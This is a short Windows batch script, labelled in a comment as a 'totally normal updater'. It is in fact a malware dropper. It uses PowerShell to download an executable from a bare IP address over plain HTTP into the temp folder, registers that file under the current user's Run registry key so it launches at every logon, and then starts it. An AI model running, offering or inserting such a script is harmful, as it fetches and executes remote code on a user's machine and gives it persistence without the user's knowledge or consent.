@echo off
rem totally normal updater
powershell -c "Invoke-WebRequest http://203.0.113.15/update.exe -OutFile %TEMP%\update.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /d %TEMP%\update.exe
start %TEMP%\update.exe
